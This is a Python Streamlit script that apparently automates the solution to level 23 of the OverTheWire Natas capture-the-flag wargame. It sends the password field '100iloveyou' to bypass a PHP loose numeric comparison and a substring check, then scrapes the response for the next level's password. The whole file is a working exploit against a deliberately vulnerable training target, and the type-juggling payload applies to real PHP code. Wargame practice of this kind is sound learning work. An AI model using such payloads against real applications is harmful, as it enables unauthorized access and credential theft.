import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting PHP Numeric Type Juggling & Substring Matching Vulnerabilities...")
    
    # 1. Align credentials cleanly using the correct target user
    username = "natas23"
    current_password = context.get('password', '').strip()
    session.auth = (username, current_password)
    
    # Explicitly target the correct endpoint URL path
    target_url = "http://natas23.natas.labs.overthewire.org/index.php"
    st.write(f"🌐 Explicitly routing payload to: `{target_url}`")
    
    # 2. Craft the type-juggling exploit payload
    # '100' satisfies the (> 10) condition, 'iloveyou' satisfies the strstr requirement
    payload_data = {"passwd": "100iloveyou"}
    st.write(f"📡 Transmitting payload parameters: `{payload_data}`")
    
    try:
        response = session.post(target_url, data=payload_data, timeout=10)
        
        # 3. Process the server's response text matching criteria
        if "The credentials for the next level are" in response.text:
            st.success("🎯 PHP loose comparison condition bypassed successfully!")
            
            # Find all valid token hashes on the page canvas
            all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', response.text)
            new_tokens = [t for t in all_tokens if t != current_password]
            
            if new_tokens:
                st.success("🎯 Level 23 challenge resolved successfully!")
                st.code(f"Natas 24 Password: {new_tokens[0]}")
            else:
                st.warning("Exploit worked, but no unique password string pattern matched our filters.")
                with st.expander("Examine Page Content Output"):
                    st.code(response.text, language="html")
        else:
            st.error("The server rejected the payload alignment.")
            with st.expander("Examine Page Response State"):
                st.code(response.text, language="html")
                
    except Exception as e:
        st.error(f"Execution failed due to programmatic error: {str(e)}")